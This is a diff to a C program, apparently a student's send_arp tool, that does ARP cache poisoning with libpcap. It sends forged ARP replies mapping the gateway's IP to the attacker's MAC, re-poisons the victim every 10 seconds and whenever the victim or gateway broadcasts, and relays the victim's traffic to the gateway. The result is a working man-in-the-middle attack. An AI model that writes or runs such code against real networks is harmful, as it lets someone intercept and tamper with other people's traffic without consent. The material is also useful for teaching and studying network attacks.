@@ -1,11 +1,5 @@
 #include "send_arp.h"
 
-void timer_handler (int signum)
-{
-        static int count = 0;
-        printf("timer expired %d timers\n", ++count);
-}
-
 int main(int argc, char* argv[]){
 	struct in_addr      myIp,	GWIp,	victimIp;
     struct ether_addr   myMac,	victimMac, GWMac;
@@ -55,20 +49,11 @@ int main(int argc, char* argv[]){
 	ether_aton_r(buf, &victimMac);
 	fclose(fp);
 
-	struct sigaction sa;
-    struct itimerval timer;
 	struct pcap_pkthdr *pkthdr;
-
-    // Install timer_handler as the signal handler for SIGVTALRM.
-    memset (&sa, 0, sizeof (sa));
-    sa.sa_handler = &timer_handler;
-    sigaction (SIGVTALRM, &sa, NULL);
-    timer.it_value.tv_sec = 10;
-    // ... and every 250 msec after that.
-    timer.it_interval.tv_sec = 10;
-    // Start a virtual timer. It counts down whenever this process is executing.
-    setitimer (ITIMER_VIRTUAL, &timer, NULL);
-
+	time_t start = 0, end = 0;
+	double gap = 0;
+	time(&start);
+	
 	while(1){
 		int ispacket = 0;
 		ispacket = pcap_next_ex(pcd, &pkthdr, &packet);
@@ -78,29 +63,20 @@ int main(int argc, char* argv[]){
 		}
 		else if(ispacket == 0)	continue;
 
+		time(&end);
+		if(difftime(end, start) >= 10){
+			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
+			time(&start);
+			printf("time expired\n");
+		}
+
 		if( ( isbroadcast(packet, GWIp) ) || ( isbroadcast(packet, victimIp) ) ) {
-			sleep(1);	// after sender get the reply from the GW
+			//sleep(1);	// after sender get the reply from the GW
 			ARPreply(victimMac, victimIp, myMac, GWIp, pcd);
 		}
 
 		//victim->GW가 있으면 잡기. 만약 잡히면 수정해서(source mac) relay
 		pcap_victiom_to_GW(victimIp, GWIp, myMac, myIp, device, pcd, packet);
-/*
-		struct ether_header *eth2;   // ethernet header struct
-    	struct ip *iph2;				// ip header struct
-
-		eth2 = (struct ether_header *)packet;
-		packet = packet + sizeof(struct ether_header);
-
-		// is it to the GW ip?
-		if(ntohs(eth2->ether_type) == ETHERTYPE_IP){
-			iph2 = (struct ip *) packet;
-			if(memcmp(&(iph2->ip_dst), &GWIp, sizeof(struct in_addr)) == 0){
-				printf("*******Is really IP switched          : %s\n", inet_ntoa(iph2->ip_src));
-				printf("*******Source MAC      : %02X:%02X:%02X:%02X:%02X:%02X\n", eth2->ether_shost[0], eth2->ether_shost[1], eth2->ether_shost[2], eth2->ether_shost[3], eth2->ether_shost[4], eth2->ether_shost[5]);
-			}
-		}
-*/	
 	}
 	// get the packet [victim(sender) > Gateway(target)]
 
